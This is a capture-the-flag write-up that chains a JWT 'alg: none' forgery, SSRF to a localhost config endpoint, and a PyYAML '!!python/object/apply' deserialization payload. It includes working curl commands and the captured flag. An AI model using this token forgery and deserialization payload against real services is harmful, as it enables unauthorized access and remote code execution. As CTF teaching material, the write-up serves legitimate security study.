# Network Management Service CTF Writeup

## Challenge Information

- **Title:** Network Management Service
- **Description:** A network management service available for authenticated admin. The flag is in env: `FLAG`
- **Service:** HTTP API with JWT authentication
- **URL:** http://68.219.177.187:8012

## Reconnaissance

### Initial Discovery

The service exposes two main endpoints:

- `/api/probe` - Requires authentication via Bearer token
- `/internal/config` - Restricted to "internal access only"

### API Endpoints Analysis

```bash
# Root endpoint
curl http://68.219.177.187:8012/
# Response: {"message":"Welcome to Network Management Service. Admin access required for advanced features."}

# OpenAPI specification
curl http://68.219.177.187:8012/openapi.json
```

From the OpenAPI spec, we identified:

- `/api/probe` accepts `ProbeRequest` with `target`, `method`, and `data` fields
- `/internal/config` accepts `YamlConfig` with a `config` string
- JWT Bearer authentication required for `/api/probe`

## Vulnerability Analysis

### 1. JWT Authentication Bypass

The service was vulnerable to JWT algorithm confusion attack:

```bash
# Successful authentication bypass
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"target":"http://localhost:8012/", "method":"GET"}'
```

**Vulnerability:** The JWT implementation accepted tokens with `alg: none`, allowing unsigned tokens to be treated as valid.

### 2. Server-Side Request Forgery (SSRF)

The `/api/probe` endpoint allowed making HTTP requests to any target, including internal services:

```bash
# SSRF to internal endpoint
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"target":"http://localhost:8012/internal/config", "method":"GET"}'
```

**Vulnerability:** No restrictions on target URLs, allowing access to internal endpoints.

### 3. YAML Deserialization Attack

The `/internal/config` endpoint processed YAML configuration unsafely:

```yaml
!!python/object/apply:os.getenv [FLAG]
```

**Vulnerability:** The service used unsafe YAML parsing (`yaml.load()` instead of `yaml.safe_load()`), enabling arbitrary code execution.

## Exploitation Chain

### Step 1: Bypass Authentication

First, let's analyze the JWT token structure:

```bash
# Decode JWT header
echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0' | base64 -d
# Output: {"typ":"JWT","alg":"none"}

# Decode JWT payload
echo 'eyJyb2xlIjoiYWRtaW4ifQ' | base64 -d
# Output: {"role":"admin"}

# Create unsigned JWT with alg: none
JWT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."
```

Test the authentication bypass:

```bash
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"target":"http://localhost:8012/", "method":"GET"}'
# Response: {"result":"{\"message\":\"Welcome to Network Management Service. Admin access required for advanced features.\"}"}
```

### Step 2: Leverage SSRF for Internal Access

First, let's test accessing the internal config endpoint:

```bash
# Try GET method first (fails)
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"target":"http://localhost:8012/internal/config", "method":"GET"}'
# Response: {"result":"{\"detail\":\"Method Not Allowed\"}"}

# Try POST method without data (shows required fields)
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." \
  -d '{"target":"http://localhost:8012/internal/config", "method":"POST"}'
# Response: {"result":"{\"detail\":[{\"type\":\"missing\",\"loc\":[\"body\"],\"msg\":\"Field required\",\"input\":null}]}"}
```

### Step 3: Execute YAML Deserialization Payload

Now we can execute the YAML deserialization attack to retrieve the flag:

```bash
# Set the JWT token variable
JWT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."

# Execute the final payload
curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -d '{"target":"http://localhost:8012/internal/config", "method":"POST", "data": {"config":"!!python/object/apply:os.getenv [FLAG]"}}'
```

**Success!** The response contains the flag:
```json
{"result":"{\"message\":\"Config applied\",\"loaded\":\"SecurinetsENIT{58cc662ea042cfc6d0cd6f8a04442a6a}\"}"}
```

The final payload chain:

1. **JWT Bypass:** `alg: none` token with admin role
2. **SSRF:** Access `internal/config` via localhost  
3. **RCE:** YAML deserialization to execute `os.getenv("FLAG")`

## Flag

```
SecurinetsENIT{58cc662ea042cfc6d0cd6f8a04442a6a}
```

## Complete Exploit Command

```bash
# Final working exploit
JWT_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."

curl -X POST http://68.219.177.187:8012/api/probe \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_TOKEN" \
  -d '{"target":"http://localhost:8012/internal/config", "method":"POST", "data": {"config":"!!python/object/apply:os.getenv [FLAG]"}}'
```

**Response:**
```json
{"result":"{\"message\":\"Config applied\",\"loaded\":\"SecurinetsENIT{58cc662ea042cfc6d0cd6f8a04442a6a}\"}"}
```

## Timeline

1. Discovered JWT authentication bypass using `alg: none`
2. Identified SSRF vulnerability in `/api/probe` endpoint
3. Found unsafe YAML deserialization in `/internal/config`
4. Chained vulnerabilities to achieve remote code execution
5. Retrieved flag from environment variables